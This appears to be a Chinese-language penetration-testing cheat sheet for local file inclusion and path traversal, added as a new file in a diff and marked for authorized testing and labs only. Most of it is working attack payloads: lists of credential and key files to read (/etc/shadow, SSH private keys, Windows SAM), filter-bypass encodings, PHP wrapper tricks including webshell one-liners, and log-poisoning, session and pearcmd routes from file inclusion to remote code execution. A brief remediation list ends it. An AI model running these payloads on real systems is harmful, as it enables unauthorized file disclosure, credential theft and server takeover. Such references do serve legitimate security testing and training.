@@ -1,0 +1,78 @@
+==========================================================================
+ 文件包含 / 目录穿越 (LFI / Path Traversal) Payload 速查
+ 仅用于授权测试与靶场
+==========================================================================
+
+【0x01 Linux 敏感文件】
+  /etc/passwd /etc/shadow /etc/hosts /etc/issue /etc/os-release
+  /proc/self/cmdline  /proc/self/environ  /proc/self/fd/0
+  /proc/1/cmdline     /proc/sched_debug   /proc/net/tcp
+  /var/log/apache2/access.log   /var/log/apache/access.log
+  /var/log/nginx/access.log     /var/log/auth.log
+  /var/lib/mysql/user.MYD
+  /root/.bash_history  /home/<user>/.bash_history
+  /root/.ssh/id_rsa    /home/<user>/.ssh/id_rsa
+  Web: /var/www/html/index.php  /usr/local/etc/php/php.ini
+       /app/app.py  /opt/app/application.yml  /flag /.dockerenv
+  Docker: /proc/1/cgroup  /proc/self/mountinfo
+
+【0x02 Windows 敏感文件】
+  C:\Windows\win.ini            （最常用验证点，内容固定 [fonts]）
+  C:\Windows\System32\drivers\etc\hosts
+  C:\Windows\System32\config\SAM
+  C:\Windows\System32\config\SYSTEM
+  C:\Windows\repair\SAM
+  C:\Windows\Panther\Unattend.xml
+  C:\Windows\php.ini  C:\xampp\php\php.ini  C:\phpstudy\php\php.ini
+  C:\inetpub\wwwroot\web.config
+  C:\Windows\System32\inetsrv\config\applicationHost.config
+  %SYSTEMROOT%\... 形式也可尝试
+
+【0x03 穿越绕过（../ 被过滤时）】
+  正常:        ../../../../etc/passwd
+  双写:        ....//....//....//etc/passwd
+  URL 编码:    ..%2f..%2f..%2fetc%2fpasswd
+  双重编码:    ..%252f..%252fetc%252fpasswd
+  反斜杠:      ..\..\..\windows\win.ini
+  绝对路径:    /etc/passwd           （include 直接绝对路径）
+  PHP 伪协议:
+    php://filter/convert.base64-encode/resource=index.php
+    php://filter/read=convert.iconv.utf-8.utf-16le/resource=index.php
+    php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode/resource=1
+    data://text/plain,<?php system($_GET[1]);?>
+    data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzFdKTsgPz4=
+    php://input   POST body 放 <?php system('id');?>
+    phar://upload/x.phar   zip://x.zip%23shell.php
+  长度截断(老版本 PHP<5.3.4): /etc/passwd/././...（超 4096 字节）
+  空字节截断(更老): /etc/passwd%00.jpg
+  后缀拼接绕过(.php):
+    ?f=php://filter/convert.base64-encode/resource=flag    （自动补 .php 也能读）
+    ?f=/etc/passwd%23 / ?f=/etc/passwd?
+
+【0x04 LFI -> RCE（日志/session/临时文件）】
+  日志投毒:
+    1) User-Agent 写马:  Burp 改 UA: <?php system($_GET['c']);?>
+    2) 包含日志: ?f=/var/log/nginx/access.log&c=id
+       (Apache: /var/log/apache2/access.log)
+  SSH 日志: ssh '<?php system($_GET[c]);?>'@target  -> 包含 /var/log/auth.log
+  Session:
+    PHPSESSID=abc123；先访问 ?PHPSESSID=abc123 触发
+    写入点: session.upload_progress / 任意 session 变量
+    包含: /var/lib/php/sessions/sess_abc123 (或 /tmp/sess_abc123)
+  /proc/self/environ:  Referer 写马后包含（老旧环境）
+  临时文件竞争: PHP 上传临时文件 /tmp/phpXXXXXX，配合 phpinfo LFI 脚本爆破
+  pearcmd:  ?f=/usr/local/lib/php/pearcmd.php&+config-create+... 写马
+  mail:     利用 sendmail -C 写日志马（经典 hxp 题）
+
+【0x05 目录穿越读源码验证】
+  ?file=../../../../var/www/html/config.php        可能被 PHP 直接执行不回显
+  -> 必须用 php://filter base64 才能看到源码
+  Java: ?path=WEB-INF/web.xml
+        ?path=../classes/application.properties
+        SpringBoot: /actuator/env 配合 ..; 绕过
+  Node: ?path=../../package.json  /proc/self/cwd/.env
+
+【0x06 修复对照（写报告用）】
+  白名单包含；realpath 规范化后校验前缀；禁用危险伪协议 allow_url_include=Off；
+  关闭错误回显；上传目录不可执行；chroot/OpenBasedir 限制。
+==========================================================================
